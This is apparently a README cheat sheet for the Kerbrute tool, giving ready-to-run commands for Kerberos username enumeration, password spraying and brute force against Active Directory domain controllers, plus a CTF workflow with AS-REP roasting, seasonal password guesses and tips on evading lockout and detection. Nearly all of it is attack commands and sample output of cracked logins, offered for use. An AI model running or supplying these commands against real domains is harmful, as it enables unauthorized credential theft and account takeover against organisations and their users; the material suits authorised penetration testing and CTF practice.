# 🔑 Kerbrute - Kerberos User Enumeration

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Kerberos Pre-Auth Bruteforcing Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 Table of Contents

- [What is Kerbrute](#-what-is-kerbrute)
- [Installation](#-installation)
- [User Enumeration](#-user-enumeration)
- [Password Spraying](#-password-spraying)
- [Brute Force](#-brute-force)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Kerbrute

**Kerbrute** abuses Kerberos pre-authentication to enumerate users and spray passwords:

- 🔍 **User Enumeration** - Find valid usernames without credentials!
- 🔐 **Password Spray** - Test one password against many users
- 💥 **Brute Force** - Full credential testing
- 🚫 **No Lockout Risk** - Pre-auth failures don't trigger lockouts

### Why Kerbrute?

| Method | Triggers Lockout | Logs Generated |
|--------|------------------|----------------|
| LDAP Bind | Yes | Yes |
| SMB Auth | Yes | Yes |
| **Kerberos Pre-Auth** | **No** | Minimal |

---

## 🚀 Installation

### Download Binary

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### From Source

```bash
go install github.com/ropnop/kerbrute@latest
```

### Verify

```bash
kerbrute --help
```

---

## 🔍 User Enumeration

### Basic Usage

```bash
# Enumerate users from wordlist
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# With domain controller hostname
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Output Options

```bash
# Verbose output
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Output to file
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# JSON output
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Threading

```bash
# Increase threads (default: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Safe threading
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Sample Output

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Password Spraying

### Basic Spray

```bash
# Single password against users
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# From file
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Multiple Passwords

```bash
# Spray multiple passwords (one at a time!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Wait 5 min between sprays
done
```

### Output

```bash
# Output valid creds
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Sample Output

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Safe Spraying

```bash
# Check password policy first!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Low and slow
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Brute Force

### Full Brute Force

```bash
# Test all username:password combinations
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Combined List

```bash
# Using username:password format
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# creds.txt format:
# admin:Password1
# john:Summer2024
```

---

## 📊 Quick Reference

### Commands

| Command | Description |
|---------|-------------|
| `userenum` | Enumerate valid usernames |
| `passwordspray` | Test password against users |
| `bruteuser` | Brute force single user |
| `bruteforce` | Test user:pass combinations |

### Essential Options

| Option | Description |
|--------|-------------|
| `-d` | Domain name |
| `--dc` | Domain Controller IP/hostname |
| `-t` | Threads (default: 10) |
| `-o` | Output file |
| `-v` | Verbose output |
| `--delay` | Delay between attempts (ms) |

### User Enumeration

```bash
# Basic
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# With output
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Fast
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Password Spray

```bash
# Basic spray
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Safe spray
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Wordlists for User Enum

```bash
# Common names
/usr/share/seclists/Usernames/Names/names.txt

# Top usernames
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Custom format
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Common Passwords

```
Season+Year: Summer2024!, Winter2024!, Fall2024!
Company+Num: CompanyName123!, Company2024!
Generic: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 CTF Tips

1. **Always enum first** - Free usernames without creds!
2. **Check AS-REP** - After finding users, check for no preauth
3. **Spray carefully** - One password, then wait
4. **Check policy** - Know lockout threshold
5. **Use delay** - Avoid detection

### Workflow

```bash
# 1. Enumerate users
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Check AS-REP roastable
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Password spray
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Resources

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [ropnop Blog](https://blog.ropnop.com/)

### Related Cheatsheets
- [AD Methodology](../AD-Attack-Methodology/README.md)
- [Rubeus](../Rubeus/README.md)
- [CrackMapExec](../CrackMapExec/README.md)

---

<p align="center">
  <b>🔑 Enumerate Users, Spray Passwords!</b><br>
  <i>Kerbrute - The stealthy way in</i>
</p>
